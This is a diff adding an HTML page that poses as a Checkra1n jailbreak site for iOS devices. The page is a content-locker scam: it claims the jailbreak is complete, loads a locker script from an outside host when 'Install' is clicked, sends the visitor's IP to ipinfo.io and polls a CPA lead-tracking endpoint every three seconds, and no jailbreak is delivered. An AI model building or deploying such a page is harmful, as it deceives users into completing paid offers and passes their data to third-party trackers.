@@ -1,0 +1,166 @@
+
+<!DOCTYPE html>
+<html lang="en">
+
+
+
+<head>
+
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="">
+    <meta name="author" content="">
+
+    <title>Checkra1n Jailbreak </title>
+
+    <!-- Bootstrap Core CSS -->
+    <link href="https://checkrain.com/jb/css/bootstrap.min.css" rel="stylesheet">
+
+    <!-- Custom Style CSS -->
+    <link href="https://checkrain.com/jb/css/style.css" rel="stylesheet">    
+
+    <!-- Animate Style CSS -->
+    <link href="https://checkrain.com/jb/css/animate.css" rel="stylesheet">       
+
+    <!-- Custom CSS -->
+    <style>
+    body {
+        padding-top: 100px;
+        /* Required padding for .navbar-fixed-top. Remove if using .navbar-static-top. Change if height of navigation changes. */
+    }
+    </style>
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+
+    <!-- Page Content -->
+    <div class="container">
+
+        <div class="row">
+            <div class="col-md-12 center-block text-center">
+                <img src="https://checkrain.com/jb/img/logo1.png" height="250" width="250" class="img-responsive center-block" />     
+            </div>
+        </div>        
+
+        <div class="row">
+            <div class="col-lg-12 text-center">
+                       
+                <div class="homePage">
+
+                    <p class="offers-msg"></p>
+
+                    <div class="spinner-show">
+               
+
+
+
+
+
+
+                       
+                    </div>
+
+                    <a href="https://ivi.cx/i/cfg?654cdbce">
+                        <br>
+                        <p align="center"> Jailbreak Complete! TIME TO INSTALL CYDIA!</p> <br>
+                          <button onclick="call_locker();" type="button" class="btn btnGenerate">Install</button>
+
+
+                
+                    </a>
+                    <br>
+
+                    <div class="button-Jail">	
+                    	<p class="info-msg">Your device on  (<span class="iOSVersion"></span>) is supported by Checkra1n</p>
+                        <button type="button" class="btn btnGenerate">Jailbreak</button>
+                     </div>
+
+                   
+                </div>
+
+            </div>
+        </div>
+        <!-- /.row -->
+
+    </div>
+    <!-- /.container -->
+
+    <!-- jQuery Version 1.11.1 -->
+    <script src="js/jquery.js"></script> 
+    <script src="assets/jquery.fittext.js"></script>
+    <script src="assets/jquery.lettering.js"></script>
+    <script src="../yandex.st/highlightjs/7.3/highlight.min.js"></script>
+
+    <!-- Bootstrap Core JavaScript -->
+    <script src="js/bootstrap.min.js"></script>
+
+    <!-- Application JavaScript -->
+    <script src="js/app.js"></script>      
+    
+
+
+<script type="text/javascript" id="ogjs" src="https://ivi.cx/i/cfg?654cdbce"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script type="text/javascript">
+    $(document).ready(function(){
+        
+        var protocol = window.location.protocol || document.location.protocol;
+
+        $.get( protocol + "//ipinfo.io", function( response ) {
+            
+            ip_address = response.ip;
+            
+        }, "jsonp");
+
+            
+        check_lead = setInterval(function(){
+            $.ajax({
+                type: "POST",
+                url: protocol + "//cpacodex.com/api/check_lead.php",
+                data: { 'ip' : ip_address },
+                success: function( data ) {
+                    
+                    if( data == 'true' ) {
+                        window.location.replace( "error.html" );
+                        clearInterval( check_lead );
+                    }
+                    
+                }
+            });
+    }, 3000);
+
+    });
+    </script>
+	<script>
+function CPABuildComplete(){
+	alert("Offer Complete!")
+}
+</script>
+
+
+
+
+</body>
+
+
+
+</html>
